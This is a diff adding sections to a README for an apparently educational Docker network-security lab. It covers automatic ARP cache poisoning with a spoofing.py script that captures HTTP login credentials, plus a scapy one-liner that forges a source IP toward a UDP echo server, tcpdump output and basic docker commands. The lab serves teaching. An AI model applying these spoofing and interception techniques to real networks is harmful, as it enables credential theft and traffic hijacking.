@@ -82,3 +82,93 @@ If the attack was successful you should be able to see the MAC address of `bob's
 > `watch` executes the command `ip neigh show` (show ARP cache) every second (`-n1`) and highlights changes (`-d`).
 
 > Sometimes the ARP cache does not get overwritten immediately - so try another time if there is no success.
+## Automatic ARP Cache Poisoning
+
+> Notes for `spoofing.py`:
+>
+> - Reports captured HTTP data twice (incoming and outgoing - needs filtering)
+> - Sometimes packets are not captured
+
+To start the automatic ARP cache poisoning, run on `evie`:
+
+```bash
+$ python3 spoofing.py
+... # wait for output
+```
+
+and let a client do an HTTP request (on `alice`):
+
+```bash
+# HTTP GET
+$ curl "http://bob/login?user=myuser&pass=mysecret"
+...
+# HTTP POST
+$ curl "http://bob/login" --data "user=myuser&pass=mysecret"
+...
+```
+## Manual IP Spoofing
+
+For the IP spoofing we use a echo server that just returns the request-data 10 times to the address contained in the IP-packet's `source` field.
+
+> To check if the UDP Echo server is running you can `nc -u 10.10.0.104 9999` from any other machine in this lab setup and send some arbitrary data. You should receive 10-times your request.
+
+On the attacker (`evie`) create a packet that is addressed to the echo server and contains e.g. `alice's` IP address in the `src`-field.
+
+```python
+$ scapy
+...
+# Create a IP/UDP/Data-Packet and send it via L3 to the Server
+>>> send(IP(dst='10.10.0.104', src='10.10.0.101')/UDP(dport=9999)/Raw(load="abc"))
+...
+```
+
+Monitor the incoming UDP data on `alice` using:
+
+```bash
+$ tcpdump -i eth0 -X udp
+...
+15:21:59.013318 IP udpserv.arplab_lab-net.9999 > alice.53: 24930 updateM+ [b2&3=0x6361] [24930a] [25187q] [25441n] [25187au] [|domain]
+	0x0000:  4500 003a 6ed3 4000 4011 b6ff 0a0a 0068  E..:n.@.@......h
+	0x0010:  0a0a 0065 270f 0035 0026 1518 6162 6361  ...e'..5.&..abca
+	0x0020:  6263 6162 6361 6263 6162 6361 6263 6162  bcabcabcabcabcab
+	0x0030:  6361 6263 6162 6361 6263                 cabcabcabc
+...
+```
+
+## Common docker commands
+
+### Control containers
+
+```bash
+# Bring containers up
+$ docker-compose up -d
+# Show logs of all containers
+$ docker-compose logs -f
+# Bring all containers down
+$ docker-compose down
+...
+```
+
+### List running containers
+
+```bash
+$ docker ps
+CONTAINER ID   IMAGE          COMMAND               CREATED         STATUS         PORTS     NAMES
+<id>           victim:1.0     "python3 app.py"      4 seconds ago   Up 2 seconds             alice
+<id>           udpserv:1.0    "python3 server.py"   4 seconds ago   Up 2 seconds             udpserv
+<id>           victim:1.0     "python3 app.py"      4 seconds ago   Up 2 seconds             bob
+<id>           attacker:1.0   "/bin/sh"             4 seconds ago   Up 2 seconds             evie
+```
+
+### Accessing a containers shell
+
+Start a shell in one of the containers (by name of the container):
+
+```bash
+$ docker exec -it evie /bin/bash
+root@evie:/#
+```
+
+## License
+
+The work in this repository may be reused under the terms of [(CC BY-SA 4.0)](https://creativecommons.org/licenses/by-sa/4.0/).
